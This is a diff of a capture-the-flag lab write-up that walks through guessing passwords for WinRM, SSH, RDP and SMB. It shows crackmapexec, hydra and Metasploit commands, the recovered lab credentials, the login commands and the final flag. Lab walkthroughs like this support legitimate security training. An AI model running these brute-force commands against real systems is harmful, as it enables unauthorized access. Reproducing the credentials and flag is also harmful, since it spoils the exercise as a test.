@@ -18,6 +18,10 @@ Example:
 crackmapexec winrm 10.129.42.197 -u user.list -p password.list
 ```
 
+Example:
+```go
+crackmapexec smb 10.129.42.197 -u user.list -p password.list --shares
+```
 
 #### Evil-WinRM
 
@@ -69,100 +73,111 @@ SSH
 ssh USERNAME@10.129.249.226
 ```
 
-1) Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
+### Question 1
 
-##### NMAP
+Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
+
+#### Crackmapexec
 
 ```go
-nmap -sC -A 10.129.249.226            
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-20 22:09 EDT
-Nmap scan report for 10.129.249.226
-Host is up (0.13s latency).
-Not shown: 992 closed tcp ports (reset)
-PORT     STATE SERVICE       VERSION
-22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
-| ssh-hostkey: 
-|   2048 f8:7f:1a:49:37:df:4d:9f:1b:13:c3:9a:bd:de:55:b4 (RSA)
-|   256 b9:c9:3a:f1:fc:3b:85:27:09:2a:69:c1:43:0b:97:9b (ECDSA)
-|_  256 d1:a8:1a:e9:26:82:4b:a2:48:92:06:f8:ed:13:5d:71 (ED25519)
-111/tcp  open  rpcbind       2-4 (RPC #100000)
-| rpcinfo: 
-|   program version    port/proto  service
-|   100000  2,3,4        111/tcp   rpcbind
-|   100000  2,3,4        111/tcp6  rpcbind
-|   100000  2,3,4        111/udp   rpcbind
-|   100000  2,3,4        111/udp6  rpcbind
-|   100003  2,3         2049/udp   nfs
-|   100003  2,3         2049/udp6  nfs
-|   100003  2,3,4       2049/tcp   nfs
-|   100003  2,3,4       2049/tcp6  nfs
-|   100005  1,2,3       2049/tcp   mountd
-|   100005  1,2,3       2049/tcp6  mountd
-|   100005  1,2,3       2049/udp   mountd
-|   100005  1,2,3       2049/udp6  mountd
-|   100021  1,2,3,4     2049/tcp   nlockmgr
-|   100021  1,2,3,4     2049/tcp6  nlockmgr
-|   100021  1,2,3,4     2049/udp   nlockmgr
-|   100021  1,2,3,4     2049/udp6  nlockmgr
-|   100024  1           2049/tcp   status
-|   100024  1           2049/tcp6  status
-|   100024  1           2049/udp   status
-|_  100024  1           2049/udp6  status
-135/tcp  open  msrpc         Microsoft Windows RPC
-139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-445/tcp  open  microsoft-ds?
-2049/tcp open  nlockmgr      1-4 (RPC #100021)
-3389/tcp open  ms-wbt-server Microsoft Terminal Services
-| rdp-ntlm-info: 
-|   Target_Name: WINSRV
-|   NetBIOS_Domain_Name: WINSRV
-|   NetBIOS_Computer_Name: WINSRV
-|   DNS_Domain_Name: WINSRV
-|   DNS_Computer_Name: WINSRV
-|   Product_Version: 10.0.17763
-|_  System_Time: 2025-04-21T02:12:36+00:00
-| ssl-cert: Subject: commonName=WINSRV
-| Not valid before: 2025-04-20T02:10:51
-|_Not valid after:  2025-10-20T02:10:51
-|_ssl-date: 2025-04-21T02:12:44+00:00; +2m20s from scanner time.
-5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-title: Not Found
-|_http-server-header: Microsoft-HTTPAPI/2.0
-No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
-TCP/IP fingerprint:
-OS:SCAN(V=7.95%E=4%D=4/20%OT=22%CT=1%CU=40819%PV=Y%DS=2%DC=T%G=Y%TM=6805A92
-OS:0%P=aarch64-unknown-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS
-OS:=S%TS=U)SEQ(SP=104%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=106%GCD
-OS:=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=107%GCD=1%ISR=10A%TI=I%CI=I%I
-OS:I=I%SS=S%TS=U)SEQ(SP=F9%GCD=1%ISR=FF%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M53
-OS:CNW8NNS%O2=M53CNW8NNS%O3=M53CNW8%O4=M53CNW8NNS%O5=M53CNW8NNS%O6=M53CNNS)
-OS:WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=
-OS:FFFF%O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%
-OS:DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%
-OS:O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%
-OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=
-OS:)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%
-OS:UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)
-
-Network Distance: 2 hops
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-| smb2-time: 
-|   date: 2025-04-21T02:12:39
-|_  start_date: N/A
-|_clock-skew: mean: 2m19s, deviation: 0s, median: 2m19s
-| smb2-security-mode: 
-|   3:1:1: 
-|_    Message signing enabled but not required
-
-TRACEROUTE (using port 80/tcp)
-HOP RTT       ADDRESS
-1   265.52 ms 10.10.14.1
-2   265.76 ms 10.129.249.226
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 83.91 seconds
+crackmapexec winrm 10.129.219.222 -u username.list -p password.list
 ```
 
-SMB ports 135,139, and 445 are open
+Found the credentials!
+```go
+john:november
+```
+
+Use evil-winrm to log into the machine
+```go
+evil-winrm -i 10.129.219.222 -u john -p november
+```
+
+### Question 2
+
+Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer
+
+IP
+```
+10.129.219.222
+```
+
+```go
+hydra -L username.list -P password.list ssh://10.129.219.222
+```
+
+Credentials
+```go
+dennis:rockstar
+```
+
+### Question 3
+
+ Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
+
+```go
+hydra -L username.list -P password.list rdp://10.129.219.222
+```
+
+Credentials
+```go
+chris:78956123
+```
+
+```go
+xfreerdp /v:10.129.219.222 /u:chris /p:78956123 /dynamic-resolution /cert:ignore /log-level:DEBUG
+```
+
+### Question 4
+
+Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
+
+```go
+crackmapexec smb 10.129.219.222 -u username.list -p password.list --shares
+```
+
+Credentials
+```go
+john:november
+```
+
+```go
+smbclient -U john \\\\10.129.219.222\\CASSIE
+```
+
+Won't let me access
+
+#### MSFCONSOLE
+```go
+use auxiliary/scanner/smb/smb_login
+```
+
+```go
+options
+```
+
+```go
+set user_file username.list
+```
+
+```go
+set pass_file password.list
+```
+
+```go
+set rhosts 10.129.219.222
+```
+
+This will show the share `CASSIE` is available, indicating the user `cassie` has access
+
+Credentials
+
+```go
+cassie:12345678910
+```
+
+```go
+smbclient -U cassie '\\10.129.219.222\CASSIE'
+```
+
+HTB{R3m0t3DeskIsw4yT00easy}
